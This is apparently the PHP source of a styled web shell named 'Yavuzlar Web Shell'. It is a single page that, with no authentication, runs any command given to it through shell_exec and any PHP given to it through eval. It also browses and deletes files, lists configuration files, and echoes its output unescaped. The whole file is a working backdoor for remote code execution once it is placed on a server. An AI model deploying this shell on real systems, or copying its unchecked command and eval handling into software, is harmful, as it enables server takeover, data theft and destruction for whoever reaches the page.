<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Yavuzlar Web Shell</title>
    <style>
        body {
            background-color: #1e1e2f;
            color: #00d084;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        h1 {
            color: #ffffff;
            margin-bottom: 20px;
        }
        p {
            color: #bbbbbb;
        }
        table {
            width: 90%;
            color: #ffffff;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #00d084;
        }
        th {
            background-color: #2a2a3a;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #00d084;
            background-color: #222;
            color: #00d084;
            font-size: 14px;
            border-radius: 4px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #00d084;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        input[type="submit"]:hover {
            background-color: #00b36b;
        }
        .command, .php-code {
            width: 100%;
            margin-top: 10px;
        }
        form {
            width: 90%;
            margin-top: 20px;
        }
        pre {
            background-color: #2a2a3a;
            padding: 10px;
            border-radius: 5px;
            color: #00ff00;
            max-height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <img src="images/yavuzlar_logo1.png" alt="Yavuzlar Logo" style="position: absolute; top: 50px; right: 50px; width: 250px; height: auto;">
    <h1>Yavuzlar Web Shell</h1>

    <?php 
        function formatPermissions($filePath) {
            $perms = fileperms($filePath);

            $info = match (true) {
                ($perms & 0xC000) === 0xC000 => 's', // socket
                ($perms & 0xA000) === 0xA000 => 'l', // symbolic link
                ($perms & 0x8000) === 0x8000 => '-', // regular
                ($perms & 0x6000) === 0x6000 => 'b', // block special
                ($perms & 0x4000) === 0x4000 => 'd', // directory
                ($perms & 0x2000) === 0x2000 => 'c', // character special
                ($perms & 0x1000) === 0x1000 => 'p', // FIFO pipe
                default => 'u', // unknown
            };

            $info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
            $info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
            $info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

            return $info;
        }

        $currentDir = isset($_POST['directory']) ? $_POST['directory'] : getcwd(); 
    ?>
    <p><strong>Current Directory:</strong> <?php echo $currentDir; ?></p>

    <form method="POST">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <label>Execute Command:</label>
        <input type="text" name="command" class="command" placeholder="Enter your command">
        <input type="submit" value="Run">
    </form>

    <?php 
    if (isset($_POST['command'])) {
        $command = escapeshellcmd($_POST['command']);
        if ($command == 'help') {
            echo "<pre>
                available commands:
                1. ls - List directory contents
                2. pwd - Print the current working directory
                3. cd <directory> - Change the current directory
                4. touch <filename> - Create an empty file
                5. mkdir <directory_name> - Create a new directory
                6. rm <filename> - Remove a file
                7. rmdir <directory_name> - Remove an empty directory
                8. cat <filename> - Display the content of a file
                9. clear - Clear the terminal screen
                10. download <filename> - Download a file
                11. upload <filename> - Upload a file
            </pre>";
        } else {
            $output = shell_exec($command);
            if ($output) {
                echo "<pre>$output</pre>";
            }
        }
    } 
    ?>

    <form method="POST">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <label>PHP Code (without &lt;?php ?&gt; tags):</label>
        <textarea name="php_code" class="php-code" rows="4" placeholder="Write PHP code here"></textarea>
        <input type="submit" value="Execute PHP">
    </form>
    <?php 
    if (isset($_POST['php_code'])) {
        try {
            ob_start();
            eval($_POST['php_code']);
            $phpOutput = ob_get_clean();
            echo "<pre>$phpOutput</pre>";
        } catch (Throwable $e) {
            echo "<pre>Error: " . $e->getMessage() . "</pre>";
        }
    } 
    ?>

    <h2>Files in Current Directory</h2>
    <table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
        <?php
        $files = scandir($currentDir);
        foreach ($files as $file) {
            $filePath = $currentDir . '/' . $file;
            if ($file != '.' && $file != '..') {
                echo "<tr>
                        <td>$file</td>
                        <td>" . (is_file($filePath) ? filesize($filePath) . " bytes" : "Directory") . "</td>
                        <td>" . formatPermissions($filePath) . "</td>
                        <td>
                            <form method='POST' style='display:inline;' onsubmit='return confirm(\"Are you sure you want to delete this file or directory?\")'>
                                <input type='hidden' name='delete_file' value='$filePath'>
                                <input type='submit' value='Delete'>
                            </form>
                        </td>
                    </tr>";
            }
        }
        ?>
    </table>

    <h2>Configuration Files in Current Directory</h2>
    <ul>
        <?php
        $configFiles = glob($currentDir . '/*.{ini,conf}', GLOB_BRACE);
        if (empty($configFiles)) {
            echo "<li>No configuration files found.</li>";
        } else {
            foreach ($configFiles as $configFile) {
                echo "<li>" . basename($configFile) . "</li>";
            }
        }
        ?>
    </ul>

    <?php 
    if (isset($_POST['delete_file'])) {
        $deleteFile = realpath($_POST['delete_file']);
        if (strpos($deleteFile, $currentDir) === 0) {
            if (is_dir($deleteFile)) {
                exec('rm -rf ' . escapeshellarg($deleteFile));
            } else {
                unlink($deleteFile);
            }
        }
    }
    ?>

    <form method="POST">
        <input type="hidden" name="directory" value="<?php echo $currentDir; ?>">
        <label>Create Directory:</label>
        <input type="text" name="new_directory" placeholder="Enter new directory name">
        <input type="submit" value="Create">
    </form>

    <?php
    if (isset($_POST['new_directory'])) {
        $newDirectory = preg_replace('/[^a-zA-Z0-9-_]/', '', $_POST['new_directory']);
        $dirPath = $currentDir . '/' . $newDirectory;
        
        if (!is_dir($dirPath)) { 
            mkdir($dirPath);
        } else {
            echo "<p style='color:red;'>Directory already exists.</p>"; 
        }
    }
    ?>
</body>
</html>
